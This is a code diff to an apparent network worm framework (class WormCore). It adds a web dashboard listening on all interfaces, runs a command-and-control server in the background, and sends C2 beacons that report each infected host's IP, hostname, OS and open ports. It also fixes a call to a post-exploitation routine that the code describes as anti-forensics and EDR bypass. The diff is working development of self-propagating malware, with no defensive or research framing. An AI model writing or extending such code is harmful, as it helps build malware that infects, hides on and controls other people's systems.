@@ -289,6 +289,19 @@ class WormCore:
             )
             logger.info("Host Monitor: enabled (payload mutation per host)")
 
+        # Web Dashboard
+        self.web_dashboard = None
+        try:
+            from monitoring.web_dashboard import WebDashboard
+            self.web_dashboard = WebDashboard(
+                worm_core=self,
+                host='0.0.0.0',
+                port=5000
+            )
+            logger.info("Web Dashboard: enabled (http://0.0.0.0:5000)")
+        except Exception as e:
+            logger.warning(f"Web Dashboard failed to initialize: {e}")
+
         # Evasion modules
         from evasion.ids_detector import IDSDetector
         from evasion.stealth_engine import StealthEngine
@@ -1100,13 +1113,21 @@ class WormCore:
             self.host_monitor.start_monitoring(interval=30)
             logger.info("Host Monitor started (continuous monitoring + self-healing)")
 
-        # Start C2 server
+        # Start C2 server in background
         if self.c2_server:
             try:
-                self.c2_server.start()
-                logger.info("C2 Server started")
+                self.c2_server.run_background()
+                logger.info(f"C2 Server started on {self.config.c2.c2_server}:{self.config.c2.c2_port}")
             except Exception as e:
                 logger.warning(f"Failed to start C2 Server: {e}")
+
+        # Start Web Dashboard in background
+        if self.web_dashboard:
+            try:
+                self.web_dashboard.run_background()
+                logger.info("Web Dashboard started at http://0.0.0.0:5000")
+            except Exception as e:
+                logger.warning(f"Failed to start Web Dashboard: {e}")
 
         iteration = 0
         online_learning_interval = 10
@@ -1139,7 +1160,22 @@ class WormCore:
 
             # Post-exploitation: anti-forensics + EDR bypass on infected hosts
             if self.config.evasion.stealth_mode:
-                self._post_exploitation_cleanup(ip, target)
+                self._post_exploitation_cleanup(target['ip'], target)
+
+            # Send C2 beacon for each infected host
+            if self.c2_server and target['ip'] in self.infected_hosts:
+                try:
+                    self.c2_server.process_beacon({
+                        'host_id': target['ip'],
+                        'ip': target['ip'],
+                        'hostname': target.get('hostname', 'unknown'),
+                        'os': target.get('os_guess', 'Unknown'),
+                        'ports': target.get('open_ports', []),
+                        'beacon_type': 'infection',
+                    })
+                    self.stats['c2_beacons'] += 1
+                except Exception as e:
+                    logger.debug(f"C2 beacon failed: {e}")
 
             # Propagation delay
             if self.config.propagation.propagation_delay > 0:
